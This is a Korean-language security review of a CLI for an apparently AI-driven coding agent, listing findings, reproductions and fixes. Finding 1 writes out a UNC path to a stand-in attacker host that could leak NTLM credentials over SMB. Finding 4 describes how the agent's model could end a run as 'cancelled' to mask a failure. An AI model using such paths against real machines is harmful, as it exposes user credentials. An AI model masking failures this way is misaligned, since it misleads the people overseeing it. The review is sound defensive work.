# F6 교차 검토: CLI 보안 검사 연결 (p1 커밋 3f3756d, 읽기 전용)

- 페르소나: 보안·개인정보 검토자
- 대상: `D:\project\Codaryn\.worktrees\claude-design`(브랜치 HEAD 3f3756d, main 미병합)
  - `src/cli/{run,task,config,settings,assemble,main,revert,args,guard}.ts`
  - 관련 확인: `src/engine/validate-args.ts`, `src/store/changes.ts`
- 기준: `docs/work-orders/phase-2-repair-loop.md`(R-1~R-8, S-1~S-12), `docs/cli-contract.md`, `src/contracts`. 연결 안내는 내가 쓴 S-A 보고서(`.codaryn/report-s-a-cli-security.md`)입니다.
- 파일 수정과 커밋은 없습니다. 두 worktree 모두 clean입니다. 실제 API, 외부 네트워크, 키 파일은 쓰지 않았고 값은 모두 가짜입니다.
- 실험 위치: `D:\project\Codaryn\.worktrees\claude-workspace\.codaryn\f6\`
  - p1의 `src`를 `out/`에 빌드했습니다(`main.ts` 제외).
  - `out/exp.mjs`를 `tmp/` 아래 실제 파일로 실행했습니다.
  - io는 가짜를 썼습니다. `assemble`은 입력만 가로채고 멈춥니다.
  - S-1 판정에는 실제 `locateInWorkspace`를 썼습니다.

## 발견 (중간 1, 낮음 3, 정보 3)

### 1. 중간 — revert의 `--workspace`가 S-5 검사 없이 파일 시스템에 닿음

- **위치:** `src/cli/revert.ts:38-39` (`path.resolve` 뒤 바로 `io.isDirectory`, 실제 CLI에서는 `stat`)
- **입력과 결과:**
  - `codaryn revert --workspace \\attacker.invalid\share --run 20261112T000000Z-abcdef12`를 넣으면 `isDirectory`가 `\\attacker.invalid\share\`로 호출됩니다.
  - `\\.\pipe\codaryn`도 그대로 호출됩니다.
  - run 쪽 `--workspace`는 `localPathProblem`으로 막지만 revert에는 같은 검사가 없습니다.
- **영향(추측):** 실제 CLI에서는 SMB 접속이 일어나고 Windows가 NTLM 인증을 시도할 수 있습니다(H2-5와 같은 부류). 네트워크 금지로 실제 접속은 하지 않았습니다.
- **재현:** `out/exp.mjs`의 1번 줄. 가짜 `isDirectory`가 받은 인자를 기록합니다.
- **제안:** `parseRevertArgs` 직후 `localPathProblem(parsed.args.workspace, io.cwd)` → `invalid_arguments`
- **유닛 테스트 한 줄:** "revert의 UNC·장치 `--workspace`는 `isDirectory`를 부르지 않고 `invalid_arguments`"

### 2. 낮음 — CLI가 받아들이는 `protectedPaths`를 정책 게이트는 잘못된 항목으로 봄

- **위치:** `src/cli/task.ts:139-152` `parseProtectedPaths`. 거부하는 것은 공백뿐인 항목, NUL, 절대 경로, 드라이브, `..`뿐입니다.
- **입력과 결과 (Windows):** `"tests."`, `"tests "`, `"src/a*b"`, `"src/x:y"`
  - CLI는 받아들입니다(`parseTask` ok).
  - 게이트(`src/policy/protected.ts`)는 이 항목을 잘못된 것으로 보고 fail closed합니다.
  - 그 결과 무관한 `src/a.ts` 쓰기까지 `protected_path`로 거부됩니다. 실행은 계속되고 모든 쓰기가 막혀 원인을 알기 어렵습니다.
- **판단:** 막히는 쪽이라 우회나 노출은 없습니다.
- **재현:** `out/exp.mjs`의 3번 줄
- **제안:** CLI 검증에 `src/policy/protected.ts`의 `parseProtectedEntry`를 그대로 써서, 항목이 `null`이면 `invalid_task`나 `invalid_config`로 거부합니다. 두 규칙을 한 곳에서 관리하는 셈입니다.

### 3. 낮음 — 모델이 고른 `run_command.timeoutMs`에 상한이 없음

- **위치:** `src/engine/validate-args.ts:70-74` (양의 정수면 허용), 사용처 `src/tools/command-runner.ts:272`
- **입력과 결과:** `timeoutMs: 3000000000`이 검증을 통과합니다. 같은 값의 타이머는 실제로 11ms 만에 발화했습니다(TimeoutOverflowWarning). 명령이 곧바로 시간 초과로 끝납니다.
- **판단:** S-7의 "모든 시간 값 2,147,483,647 이하"는 설정과 task에만 적용됐습니다. 모델 자신의 명령만 실패하므로 권한 확대는 없습니다.
- **재현:** `out/exp.mjs`의 4번 줄
- **제안:** `validate-args`에서 `timeoutMs <= MAX_TIMER_MS`. 실행 시간 한도보다 길게 잡는 것도 의미가 없습니다.

### 4. 낮음 — `--cancel-file`이 작업 공간 안이어도 받아들여짐

- **위치:** `src/cli/run.ts:254-259`. S-1 확인 목록에 cancel 파일이 없습니다.
- **입력과 결과:** `--cancel-file <작업공간>/stop.flag`로 실행하면 `assemble`까지 진행합니다(확인). 모델이 `write_file`로 그 파일을 만들면 실행이 `cancelled`로 끝납니다. 이 부분은 코드 판독이고 엔진 실행은 하지 않았습니다.
- **영향(추측):** 모델이 실패 대신 취소로 실행을 끝낼 수 있습니다. 결과를 받는 쪽이 `cancelled`를 `failed`와 다르게 다루면 실패가 드러나지 않을 수 있습니다.
- **재현:** `out/exp.mjs`의 6번 마지막 줄
- **제안:** 확인 목록에 넣어 `invalid_arguments`로 거부하거나, 문서에 "작업 공간 밖"을 적습니다.

### 5. 정보 — `maxOutputTokens`에 상한이 없음

- **위치:** `src/cli/task.ts:125`, `src/cli/config.ts:65`
- **입력과 결과:** `maxOutputTokens: 9007199254740991`이 `assemble`까지 갑니다(확인).
- **영향(추측):** 실제 API는 400(재시도 없음)으로 거절할 것이라 비용 위험은 없습니다. 모델 최대 출력(예: 128K) 근처의 상한을 두면 오류가 더 일찍, 더 분명하게 납니다.

### 6. 정보 — revert `--run`이 끝 점을 허용함

- **위치:** `src/cli/args.ts:42` `RUN_ID_PATTERN`
- **입력과 결과(추측, 실행 안 함):** `abc.`는 허용되고, Windows는 끝 점을 버리므로 `runs/abc`가 대상이 됩니다. 실제 run id(`<UTC>-<16진>`)는 점으로 끝나지 않으므로, 사용자 자신의 오타에만 해당합니다.

### 7. 정보 — S-1은 이번 실행의 작업 공간과만 비교함

설정 파일이 다른 작업 공간 안에 있으면, 그 작업 공간에서 돈 실행이 그 파일을 고쳐 이 실행에 영향을 줄 수 있습니다. S-1 결정 문구("작업 공간 실경로 안")의 범위 그대로라 결함은 아닙니다. 문서에 "설정·env 파일은 어떤 작업 공간에도 두지 않는다"를 권합니다.

## 문제 없던 범위 (실험으로 확인, 일부는 코드 판독)

- **S-5 순서 (run):**
  - `--task`, `--workspace`, `--config`, `--env-file`, `--cancel-file`을 파일 시스템 접근 전에 검사합니다.
  - env 파일이 `CODARYN_CONFIG`를 UNC로 설정하면, 읽은 파일이 env 파일 하나뿐인 상태에서 `invalid_config`가 됩니다.
  - task의 UNC `workspaceRoot`는 task 파일만 읽은 상태에서 `invalid_task`가 되고, `isDirectory`를 부르지 않습니다.
  - `scriptPath`도 `resolveLocal`로 검사합니다.
- **S-1:** 작업 공간 안의 설정 파일과 env 파일은 실경로 기준 `invalid_config`입니다. task 파일과 scriptPath도 목록에 있습니다(코드 판독).
- **S-4와 S-2 (간편 형식):** env 파일이 새로 설정한 8자 이상 값과 현재 키가 `assemble`의 `secrets`에 들어가고, 8자 미만 값은 들어가지 않습니다. scripted 실행에서도 키를 등록합니다(`run.ts:282`, 코드 판독).
- **S-6:**
  - 원문 검사, 파싱, 깊이 제한 검사 순서입니다.
  - 알 수 없는 이름에 현재 키 조각을 넣어도 위치는 `limits.<field>.apiKey`입니다.
  - 키 검사가 설정·task 검증보다 먼저 옵니다.
- **S-7 (두 형식 모두):**
  - 간편 형식에서 설정의 `maxTotalTokens: null`, 설정이 없거나 한도가 없으면 `invalid_config`
  - task 값이 절대 상한을 넘으면 `invalid_task`이고, 메시지에 파일 숫자가 없습니다.
  - task 값이 설정보다 크면 `invalid_task`
  - 기본값 경로: 재수정 한도 기본값, `requestTimeoutMs` 기본 600000, 검증기 기본 60000 모두 상한 안입니다.
- **S-3, S-9, S-8:**
  - `secretEnv`는 위치만 알립니다.
  - 설정 `apiBaseUrl`과 `CODARYN_API_BASE_URL` 모두 엄격 규칙입니다.
  - 간편 형식 goal의 키 검사가 설정을 읽기 전에 있습니다(`run.ts:183`).
- **메시지의 값:** 오류 7종(이름 자리의 값, 알 수 없는 필드 2종, `protectedPaths`의 `..`, 이름 속 키 조각, 검증기 timeout, `apiBaseUrl`)의 메시지에 파일 값, 키, 키 조각, 호스트가 없었습니다. 인자 오류 메시지도 고정 문구입니다.
- **최상위 예외:** `main.ts`가 run과 revert를 모두 `runGuarded`로 감싸 예외를 `internal_error` JSON으로 바꿉니다.
- **revert 경로:** 되돌리기 경로는 `Workspace.resolve` 결과와 비교합니다(`src/store/changes.ts:325`, 코드 판독). runId는 패턴과 `..` 금지로 제한됩니다.
- **예시 파일:** `examples/*.json`의 task 파일은 작업 공간(`examples/workspaces/*`) 밖에 있어 S-1에 걸리지 않습니다.

## 검사하지 않은 범위

- 실제 UNC/SMB 접속(1번의 영향은 추측), POSIX 동작
- 실제 `process.loadEnvFile`의 파싱. 실험에서는 단순 가짜 로더를 썼습니다.
- `assemble` 이후 엔진 실행, 4번의 실제 취소 흐름
- p1 worktree의 유닛·통합 테스트(실행하지 않음)
- 저장소 `revertRun` 내부의 나머지 경로 처리(F3 범위)
- `runGuarded` 밖에서 생기는 처리되지 않은 promise 거부(예: 취소 감시 타이머 콜백)
